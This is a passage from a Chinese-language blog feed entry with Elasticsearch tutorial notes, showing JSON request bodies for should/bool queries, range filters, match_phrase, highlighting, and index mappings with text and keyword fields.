id="多条件任意成立"><a href="#多条件任意成立" class="headerlink" title="多条件任意成立"></a>多条件任意成立</h5><p>请求体如下，其中<code>bool</code>代表条件查询，<code>should</code>表示多个条件任意成立一个都行，这个时候我们会同时查出价格为5999和7999的结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"5999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Users/caoyifan/blog/source/_posts/Elasticsearch笔记/18.png" alt="18"></p><h4 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h4><p>请求体如下，其中<code>filter</code>表示过滤，<code>range</code>表示范围，我们选择<code>price</code>大于6000作为条件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"filter"</span> : &#123;</span><br><span class="line">                <span class="attr">"range"</span> : &#123;</span><br><span class="line">                    <span class="attr">"price"</span> : &#123;</span><br><span class="line">                        <span class="attr">"gt"</span> : <span class="number">6000</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/19.png" alt="19"></p><h4 id="完全匹配"><a href="#完全匹配" class="headerlink" title="完全匹配"></a>完全匹配</h4><p>ES在进行匹配查询的时候，会对文字进行插词之后倒排索引，因此对于<code>category=华为</code>来讲，我们在<code>match</code>匹配的时候只写一个华或是一个为，ES都会匹配出<code>category=华为</code>的结果。如果我们需要完全匹配的话，需要将<code>match</code>改为<code>match_phrase</code></p><h4 id="高亮查询"><a href="#高亮查询" class="headerlink" title="高亮查询"></a>高亮查询</h4><p>请求体如下，这里我们的匹配规则是<code>category=iphone13</code>，并对<code>category</code>字段进行高亮处理</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span> : &#123;</span><br><span class="line">        <span class="attr">"match"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : <span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"highlight"</span> : &#123;</span><br><span class="line">        <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/20.png" alt="20"></p><h4 id="映射关系"><a href="#映射关系" class="headerlink" title="映射关系"></a>映射关系</h4><h5 id="创建一个索引映射"><a href="#创建一个索引映射" class="headerlink" title="创建一个索引映射"></a>创建一个索引映射</h5><p>首先创建一个<code>test</code>索引</p><p><img src="/2021/11/16/Elasticsearch笔记/21.png" alt="21"></p><p>创建索引的结构信息</p><p>请求路径为<code>http://localhost:9200/test/_mapping</code>，请求方式为<code>PUT</code>，请求体如下，其中<code>properties</code>表示属性设置，<code>type=text</code>表示<code>name</code>可以分词处理，<code>index=true</code>表示<code>name</code>可以被索引查询，<code>type=keyword</code>表示<code>sex</code>不可以分词处理，必须完整匹配。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"name"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"sex"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"tel"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/22.png" alt="22"></p><h5 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h5><p><img src="/2021/11/16/Elasticsearch笔记/23.png" alt="23"></p><h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><p>因为我们的<code>name</code>设置的是可以分词，因此我们在查询的时候对于<code>name</code>只匹配一个字也可以查询出来结果。</p><p><img src="/2021/11/16/Elasticsearch笔记/24.png" alt="24"></p><p>对于<code>sex</code>因为我们设置的是<code>keyword</code>，因此不可以分词查询。必须完全匹配。</p><p><img src="/2021/11/16/Elasticsearch笔记/25.png" alt="25"></p><p><img src="/2021/11/16/Elasticsearch笔记/26.png" alt="26"></p><p>而对于<code>tel</code>字段，因为<code>index</code>为<code>false</code>，即不可以通过索引进行查询，因此我们无法根据<code>tel</code>字段查到数据。</p><p><img src="/2021/11/16/Elasticsearch笔记/27.png" alt="27"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ElasticSearch简介&quot;&gt;&lt;a href=&quot;#ElasticSearch简介&quot; class=&quot;headerlink&quot; title=&quot;ElasticSearch简介&quot;&gt;&lt;/a&gt;ElasticSearch简介&lt;/h4&gt;&lt;p&gt;Elasticsearch是一个基于
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
</feed>
